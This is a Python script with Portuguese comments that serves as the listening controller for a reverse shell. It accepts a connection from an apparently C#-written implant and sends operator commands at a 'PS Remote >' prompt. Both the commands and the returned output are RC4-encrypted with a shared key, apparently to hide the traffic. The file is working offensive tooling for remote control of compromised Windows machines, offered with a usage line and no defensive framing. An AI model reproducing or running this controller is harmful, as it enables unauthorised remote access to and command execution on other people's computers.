import socket
import sys

def rc4_process(data, key):
    """
    Esta função implementa o RC4 completo, incluindo a inicialização (KSA).
    Como o seu C# faz o KSA toda vez que a função RC4 é chamada, 
    o Python deve fazer o mesmo para cada mensagem.
    """
    if isinstance(key, str):
        key = key.encode('utf-8')
    if isinstance(data, str):
        data = data.encode('utf-8')

    # KSA - Inicialização (Onde o C# faz: int[] s = Enumerable.Range(0, 256).ToArray())
    s = list(range(256))
    j = 0
    for i in range(256):
        j = (j + s[i] + key[i % len(key)]) % 256
        s[i], s[j] = s[j], s[i]

    # PRGA - Geração do fluxo e XOR
    i = 0
    j = 0
    res = []
    for byte in data:
        i = (i + 1) % 256
        j = (j + s[i]) % 256
        s[i], s[j] = s[j], s[i]
        res.append(byte ^ s[(s[i] + s[j]) % 256])
    
    return bytes(res)

def start_server(host, port, key):
    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    
    try:
        server.bind((host, port))
        server.listen(1)
        print(f"[*] Aguardando conexão em {host}:{port}...")
        
        conn, addr = server.accept()
        print(f"[+] Conectado a: {addr}")

        while True:
            # 1. Enviar comando
            command = input("PS Remote > ")
            if not command: continue
            
            # Criptografa o comando ANTES de enviar
            # O estado do RC4 inicia do zero aqui
            encrypted_cmd = rc4_process(command, key)
            conn.send(encrypted_cmd)

            if command.lower() == "exit":
                break

            # 2. Receber resposta
            # O C# enviará a resposta criptografada iniciando o RC4 do zero também
            data = conn.recv(65536) 
            if not data:
                break

            # Descriptografa iniciando o RC4 do zero
            decrypted_res = rc4_process(data, key)
            
            try:
                # Decodifica para texto legível
                print(decrypted_res.decode('utf-8'))
            except UnicodeDecodeError:
                # Caso haja caracteres especiais do Windows
                print(decrypted_res.decode('latin-1', errors='replace'))

    except Exception as e:
        print(f"[!] Erro: {e}")
    finally:
        server.close()

if __name__ == "__main__":
    if len(sys.argv) < 4:
        print("Uso: python servidor.py <IP> <PORTA> <CHAVE>")
    else:
        start_server(sys.argv[1], int(sys.argv[2]), sys.argv[3])